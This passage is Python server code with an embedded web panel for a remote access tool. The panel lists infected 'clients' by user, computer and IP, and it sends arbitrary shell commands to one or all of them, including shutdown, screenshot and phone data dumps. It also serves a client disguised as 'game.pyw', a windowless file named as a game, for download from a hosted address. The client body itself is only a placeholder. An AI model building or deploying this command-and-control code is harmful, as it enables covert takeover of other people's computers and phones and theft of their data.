                                    <button onclick="executeCommand('uptime')">Uptime</button>
                                    <button onclick="executeCommand('history')">Command History</button>
                                    <button class="danger" onclick="executeCommand('shutdown -h now')">Shutdown</button>
                                    <button class="danger" onclick="executeCommand('reboot')">Restart</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- قسم Phone -->
                        <div id="phone-content" class="os-content">
                            <div class="multi-control">
                                <strong>Phone Commands <span class="instant-badge">0ms</span>:</strong>
                                <div class="controls-grid">
                                    <button onclick="executeCommand('getprop')">System Properties</button>
                                    <button onclick="executeCommand('id')">User Info</button>
                                    <button onclick="executeCommand('netstat')">Network Status</button>
                                    <button onclick="executeCommand('ls -la')">Files List</button>
                                    <button onclick="executeCommand('ps')">Running Processes</button>
                                    <button onclick="executeCommand('df')">Storage Info</button>
                                    <button onclick="executeCommand('cat /proc/meminfo')">Memory Info</button>
                                    <button onclick="executeCommand('cat /proc/cpuinfo')">CPU Info</button>
                                    <button onclick="executeCommand('ping -c 4 google.com')">Connection Test</button>
                                    <button onclick="executeCommand('dumpsys battery')">Battery Info</button>
                                    <button onclick="executeCommand('dumpsys wifi')">WiFi Info</button>
                                    <button onclick="executeCommand('pm list packages')">Installed Apps</button>
                                    <button onclick="executeCommand('settings list system')">System Settings</button>
                                    <button onclick="executeCommand('am start -a android.settings.SETTINGS')">Open Settings</button>
                                    <button onclick="executeCommand('input keyevent 26')">Power Button</button>
                                    <button onclick="executeCommand('input keyevent 3')">Home Button</button>
                                    <button onclick="executeCommand('input keyevent 4')">Back Button</button>
                                    <button onclick="executeCommand('screencap -p /sdcard/screen.png')">Take Screenshot</button>
                                    <button onclick="executeCommand('dumpsys telephony.registry')">Phone Info</button>
                                    <button class="warning" onclick="executeCommand('am force-stop com.android.browser')">Stop Browser</button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="command-input">
                            <input type="text" id="commandInput" placeholder="Enter custom command (INSTANT 0ms execution)" 
                                   onkeypress="if(event.key=='Enter') executeCustomCommand()">
                            <button onclick="executeCustomCommand()">Execute Command</button>
                            <button class="success" onclick="executeSelected('commandInput')">Execute on Selected</button>
                        </div>
                    </div>
                    
                    <div class="terminal" id="terminal">
    INSTANT REMOTE CONTROL SYSTEM READY - 0ms DELAY
    
    • Select a client from the left panel
    • Choose OS type from tabs (Windows/Linux/Phone)
    • Commands execute INSTANTLY with no delay
    • Real-time responses in under 10ms
    • All activities are logged for security
    • ULTRA INSTANT mode activated
    
                    </div>
                </div>
            </div>
            
            <script>
                let currentClientId = null;
                let commandCounter = 0;
                let allClients = [];
                let currentOSTab = 'windows';
                
                function switchOSTab(osType) {
                    // إخفاء جميع المحتويات
                    document.querySelectorAll('.os-content').forEach(content => {
                        content.classList.remove('active');
                    });
                    
                    // إلغاء تفعيل جميع التبويبات
                    document.querySelectorAll('.os-tab').forEach(tab => {
                        tab.classList.remove('active');
                    });
                    
                    // تفعيل التبويب والمحتوى المحدد
                    document.getElementById(osType + '-content').classList.add('active');
                    document.querySelector(`.os-tab:nth-child(${osType === 'windows' ? 1 : osType === 'linux' ? 2 : 3})`).classList.add('active');
                    
                    currentOSTab = osType;
                }
                //الدالة loadSessions تعمل على تحميل وعرض قائمة الجلسات/العملاء مع تحديث حالتهم في الوقت الفعلي
                async function loadSessions() {
                    try {
                        const response = await fetch('/sessions?_t=' + Date.now());
                        const sessions = await response.json();
                        allClients = sessions;
                        updateSessionStats(sessions);
                        const list = document.getElementById('sessionsList');
                        
                        if (sessions.length === 0) {
                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
                            return;
                        }
                        
                        // ⚡ الكود المبسط والأفضل:
                        list.innerHTML = sessions.map(client => {
                            const lastSeen = new Date(client.last_seen).getTime();
                            const now = Date.now();
                            const timeDiff = (now - lastSeen) / 1000;
                            
                            // 🟢 شروط أكثر وضوحاً وتحديثاً أفضل
                            let isOnline = true;
                            let statusClass = 'online-status';
                            let statusText = 'ONLINE';
                            let statusColor = '#28a745';
                            let statusEmoji = 'yes';
                            
                            if (timeDiff < 30) {
                                // 🟢 اتصال نشط جداً (أقل من 30 ثانية)
                                isOnline = true;
                                statusClass = 'online-status';
                                statusText = 'LIVE';
                                statusColor = '#28a745';
                                statusEmoji = '🟢';
                            } else if (timeDiff < 120) {
                                // 🟡 اتصال حديث (أقل من دقيقتين)
                                isOnline = true;
                                statusClass = 'online-status';
                                statusText = 'ONLINE';
                                statusColor = '#28a745';
                                statusEmoji = '🟢';
                            } else if (timeDiff < 300) {
                                // 🟠 اتصال مؤخراً (أقل من 5 دقائق)
                                isOnline = true;
                                statusClass = 'online-status';
                                statusText = 'RECENT';
                                statusColor = '#ffc107';
                                statusEmoji = '🟡';
                            } else {
                                // 🔴 غير متصل (أكثر من 5 دقائق)
                                isOnline = false;
                                statusClass = 'online-status offline';
                                statusText = 'OFFLINE';
                                statusColor = '#dc3545';
                                statusEmoji = '🔴';
                            }
                            
                            const isSelected = client.id === currentClientId;
                            
                            // ⏱️ تنسيق الوقت بشكل أفضل
                            let timeDisplay = '';
                            if (timeDiff < 60) {
                                timeDisplay = `${Math.floor(timeDiff)}s ago`;
                            } else if (timeDiff < 3600) {
                                timeDisplay = `${Math.floor(timeDiff / 60)}m ago`;
                            } else if (timeDiff < 86400) {
                                timeDisplay = `${Math.floor(timeDiff / 3600)}h ago`;
                            } else {
                                timeDisplay = `${Math.floor(timeDiff / 86400)}d ago`;
                            }
                            
                            return `
                                <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
                                     onclick="selectClient('${client.id}')">
                                    <div class="${statusClass}" title="${statusText}"></div>
                                    <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
                                    <small>User: ${client.user || 'Unknown'}</small><br>
                                    <small>OS: ${client.os || 'Unknown'}</small><br>
                                    <small>IP: ${client.ip}</small><br>
                                    <small>Last: ${timeDisplay}</small>
                                    <small style="color: ${statusColor}; font-weight: bold;"> ${statusEmoji} ${statusText}</small>
                                </div>
                            `;
                        }).join('');
                    } catch (error) {
                        console.error('Error loading sessions:', error);
                    }
                }
                //الدالة updateSessionStats تعمل على تحديث إحصائيات الجلسات/العملاء في واجهة المستخدم
                function updateSessionStats(sessions) {
                    const total = sessions.length;
                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000).length;
                    
                    document.getElementById('totalClients').textContent = total;
                    document.getElementById('activeClients').textContent = active;
                    document.getElementById('commandsSent').textContent = commandCounter;
                    document.getElementById('clientsCount').textContent = total;
                }
                //لدالة selectClient تعمل على اختيار وتحديد عميل معين في النظام
                function selectClient(clientId) {
                    currentClientId = clientId;
                    loadSessions();
                    document.getElementById('currentClient').textContent = clientId;
                    addToTerminal(`Selected client: ${clientId}\\n`);
                }
                //الدالة executeCommand تعمل على تنفيذ أوامر على العميل المحدد
                function executeCommand(command) {
                    if (!currentClientId) {
                        alert('Please select a client first!');
                        return;
                    }
                    executeSingleCommand(currentClientId, command);
                }
                //الدالة executeSingleCommand تعمل على إرسال أمر إلى عميل معين والتعامل مع النتائج
                async function executeSingleCommand(clientId, command) {
                    commandCounter++;
                    const startTime = Date.now();
                    addToTerminal(` [${clientId}] ${command}\\n`);
                    
                    try {
                        const response = await fetch('/execute', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({client_id: clientId, command: command})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            addToTerminal(`Command sent INSTANTLY\\n`);
                            waitForResult(clientId, command, startTime);
                        } else {
                            addToTerminal(`Error: ${data.error}\\n`);
                        }
                    } catch (err) {
                        addToTerminal(` Network error: ${err}\\n`);
                    }
                }
                //لدالة executeAll تعمل على تنفيذ أمر على جميع العملاء النشطين.
                function executeAll(command) {
                    if (allClients.length === 0) {
                        alert('No clients connected!');
                        return;
                    }
                    
                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 300000);
                    if (activeClients.length === 0) {
                        alert('No active clients!');
                        return;
                    }
                    
                    addToTerminal(`Executing command on ${activeClients.length} clients: ${command}\\n`);
                    
                    activeClients.forEach(client => {
                        executeSingleCommand(client.id, command);
                    });
                }
             // لدالة executeSelected تعمل على تنفيذ أمر من حقل إدخال محدد على العميل المحدد
              function executeSelected(inputId) {
                    const command = document.getElementById(inputId).value.trim();
                    if (!command) {
                        alert('Please enter a command');
                        return;
                    }
                    
                    if (currentClientId) {
                        executeCommand(command);
                    } else {
                        alert('Please select a client first');
                    }
                }  
                //الدالة executeCustomCommand تعمل على تنفيذ أمر مخصص من حقل إدخال وتنظيفه بعد التنفيذ
                function executeCustomCommand() {
                    const cmd = document.getElementById('commandInput').value.trim();
                    if (cmd) {
                        executeCommand(cmd);
                        document.getElementById('commandInput').value = '';
                    } else {
                        alert('Please enter a command');
                    }
                }
                //الدالة waitForResult تعمل على انتظار وفحص نتيجة تنفيذ الأمر من العميل بشكل فوري ومتكرر.
                function waitForResult(clientId, command, startTime) {
                    let attempts = 0;
                    const maxAttempts = 100; // More attempts for instant response
                    
                    const checkImmediately = async () => {
                        attempts++;
                        if (attempts > maxAttempts) {
                            const elapsed = (Date.now() - startTime);
                            addToTerminal(`Timeout after ${elapsed}ms: No response from ${clientId}\\n`);
                            return;
                        }
                        
                        try {
                            const response = await fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now());
                            const data = await response.json();
                            
                            if (data.result) {
                                const responseTime = (Date.now() - startTime);
                                addToTerminal(` [${clientId}] Response (${responseTime}ms):\\n${data.result}\\n`);
                            } else if (data.pending) {
                                setTimeout(checkImmediately, 10); //  10ms delay for instant checking
                            } else {
                                setTimeout(checkImmediately, 10);
                            }
                        } catch {
                            setTimeout(checkImmediately, 10);
                        }
                    };
                    checkImmediately();
                }
                //الدالة addToTerminal تعمل على إضافة نص إلى الطرفية (Terminal) وجعلها تتمركز تلقائياً على أحدث محتوى.
                function addToTerminal(text) {
                    const terminal = document.getElementById('terminal');
                    terminal.textContent += text;
                    terminal.scrollTop = terminal.scrollHeight;
                }
                //الدالة openSettings تعمل على فتح صفحة الإعدادات في نافذة أو تبويب جديد.
                function openSettings() {
                    window.open('/settings', '_blank');
                }
                //الدالة logout تعمل على تسجيل خروج المستخدم بعد التأكيد.
                async function logout() {
                    if (confirm('Are you sure you want to logout?')) {
                        const session_id = localStorage.getItem('session_id');
                        
                        try {
                            // 🔥 الآن يمكن الإرسال لأن /logout موجود
                            const response = await fetch('/logout', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ session_id: session_id })
                            });
                            
                            const data = await response.json();
                            if (data.success) {
                                localStorage.removeItem('session_id');
                                window.location = '/';
                            }
                        } catch (err) {
                            console.error('Logout error:', err);
                            localStorage.removeItem('session_id');
                            window.location = '/';
                        }
                    }
                }
                
                // ⚡ Ultra-fast auto-refresh every 1 second
                setInterval(loadSessions, 100);
                loadSessions();
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def download_python_client(self):
        """Download ULTRA INSTANT Python client"""
        client_code = '''
        #كود العميل هنا #
        '''
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="game.pyw"')
        self.end_headers()
        self.wfile.write(client_code.encode())

    def handle_client_register(self, data):
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            client_ip = self.client_address[0]
            incoming_user = data.get('user', 'Unknown')
            incoming_computer = data.get('computer', 'Unknown')
            incoming_os = data.get('os', 'Unknown')

            if incoming_user == 'Unknown' and '-' in client_id:
                try:
                    parts = client_id.split('-')
                    if len(parts) >= 2:
                        incoming_user = parts[1]
                        incoming_computer = parts[0]
                except:
                    pass
                
            existing_client = None
            for cid, client_data in self.sessions.items():
                current_user = client_data.get('user', '')
                current_computer = client_data.get('computer', '')

                if (current_user == incoming_user and 
                    current_computer == incoming_computer and 
                    incoming_user != 'Unknown' and 
                    incoming_computer != 'Unknown'):
                    existing_client = cid
                    break
                
            if existing_client is None and client_id in self.sessions:
                existing_client = client_id

            if existing_client:
                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
                self.sessions[existing_client]['status'] = 'online'
                self.sessions[existing_client]['ip'] = client_ip

                if incoming_os != 'Unknown':
                    self.sessions[existing_client]['os'] = incoming_os

                print(f" INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
            else:
                self.sessions[client_id] = {
                    'id': client_id,
                    'ip': client_ip,
                    'type': data.get('type', 'unknown'),
                    'computer': incoming_computer,
                    'os': incoming_os,
                    'user': incoming_user,
                    'first_seen': datetime.now().isoformat(),
                    'last_seen': datetime.now().isoformat(),
                    'pending_command': None,
                    'last_response': None,
                    'status': 'online'
                }
                print(f" INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
                self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                
    def send_sessions_list(self):
        with self.session_lock:
            current_time = datetime.now()
            active_clients = []
            
            for client_id, client_data in list(self.sessions.items()):
                last_seen = datetime.fromisoformat(client_data['last_seen'])
                time_diff = (current_time - last_seen).total_seconds()
                
                # 🎯 ابقاء العملاء النشطين فقط (أقل من 5 دقائق)
                if time_diff < 300:
                    # 🔥 نظام حاسم وبسيط
                    if time_diff < 10:
                        status = "🟢 LIVE"
                        is_online = True
                    elif time_diff < 30:
                        status = "🟢 ONLINE" 
                        is_online = True
                    elif time_diff < 120:
                        status = "🟡 RECENT"
                        is_online = True
                    else:
                        status = "🔴 OFFLINE"
                        is_online = False
                    
                    client_data['is_online'] = is_online
                    client_data['status'] = status
                    client_data['last_seen_seconds'] = time_diff
                    active_clients.append(client_data)
                else:
                    # 🗑️ تنظيف العملاء القدامى
                    del self.sessions[client_id]
            
            self.send_json(active_clients)   
    def handle_get_commands(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            client_id = query.get('client', [None])[0]
            
            if client_id and client_id in self.sessions:
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                pending_command = self.sessions[client_id]['pending_command']
                
                if pending_command:
                    self.sessions[client_id]['pending_command'] = None
                    self.send_json({'command': pending_command, 'instant': True})
                else:
                    self.send_json({'waiting': False, 'instant': True})
            else:
                self.send_json({'error': 'Client not found', 'instant': True})
    
    def handle_execute_command(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['pending_command'] = command
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                self.send_json({'success': True, 'executed_instantly': True})
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'INSERT INTO commands (client_id, command) VALUES (?, ?)',
                        (client_id, command)
                    )
                    self.conn.commit()
            else:
                self.send_json({'success': False, 'error': 'Client not found'})
    
    def handle_get_result(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            
            client_id = query.get('client', [''])[0]
            command = query.get('command', [''])[0]
            
            if client_id in self.sessions and self.sessions[client_id]['last_response']:
                result = self.sessions[client_id]['last_response']
                self.sessions[client_id]['last_response'] = None
                self.send_json({'result': result, 'instant': True})
            else:
                self.send_json({'pending': True, 'instant': True})
    
    def handle_client_response(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            response = data.get('response')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['last_response'] = response
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'UPDATE commands SET response = ? WHERE client_id = ? AND command = ? AND response IS NULL',
                        (response, client_id, command)
                    )
                    self.conn.commit()
            
            self.send_json({'success': True, 'instant': True})
    
    def send_command_history(self):
        try:
            if hasattr(self, 'cursor'):
                self.cursor.execute('''
                    SELECT client_id, command, response, timestamp 
                    FROM commands 
                    ORDER BY timestamp DESC 
                    LIMIT 50
                ''')
                history = self.cursor.fetchall()
                
                result = []
                for row in history:
                    result.append({
                        'client_id': row[0],
                        'command': row[1],
                        'response': row[2],
                        'timestamp': row[3]
                    })
                
                self.send_json(result)
            else:
                self.send_json([])
        except:
            self.send_json([])
    
    def send_system_status(self):
        with self.session_lock:
            status = {
                'uptime': 'Running - INSTANT MODE',
                'connected_clients': len([c for c in self.sessions.values() 
                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 30]),
                'total_commands': 0,
                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'mode': 'INSTANT',
                'response_time': '0ms'
            }
            
            if hasattr(self, 'cursor'):
                self.cursor.execute('SELECT COUNT(*) FROM commands')
                status['total_commands'] = self.cursor.fetchone()[0]
            
            self.send_json(status)
    
    def send_404_page(self):
        self.send_error(404, "Page not found")
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('X-Response-Time', '0ms')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_redirect(self, location):  # 🔥 أضف هذا
        """إعادة توجيه المستخدم"""
        self.send_response(302)
        self.send_header('Location', location)
        self.end_headers()
        
    def handle_logout(self):
        EnhancedRemoteControlHandler.level1_authenticated = False
        EnhancedRemoteControlHandler.level2_authenticated = False

def instant_cleanup_sessions():
    """INSTANT session cleanup"""
    while True:
        try:
            current_time = datetime.now()
            with EnhancedRemoteControlHandler.session_lock:
                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
                    last_seen = datetime.fromisoformat(client_data['last_seen'])
                    if (current_time - last_seen).total_seconds() > 300:
                        del EnhancedRemoteControlHandler.sessions[client_id]
            time.sleep(30)  # ⚡ Clean every 30 seconds
        except:
            pass

def main():
    handler = EnhancedRemoteControlHandler
    handler.init_database(handler)
    
    threading.Thread(target=instant_cleanup_sessions, daemon=True).start()
    
    print("=" * 80)
    print(" ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
    print("=" * 80)
    print("Control Panel:     https://game-python-1.onrender.com")
    print("Python Client:     https://game-python-1.onrender.com/download-python-client")
    print("Security Settings: https://game-python-1.onrender.com/settings")
    print("Level 1 Password: _____")
    print("Level 2 Password: _____")
    print("Database:         remote_control.db")
    print("=" * 80)
    print(" INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
    print(" All commands execute immediately without delay")
    print(" Ultra-fast communication and execution")
    print("=" * 80)
    
    try:
        # 🔥 استخدم ThreadedHTTPServer الجديد
        server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
        print(" Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
        print(" Features: Instant Execution, 0ms Delay, Real-time Responses")
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()
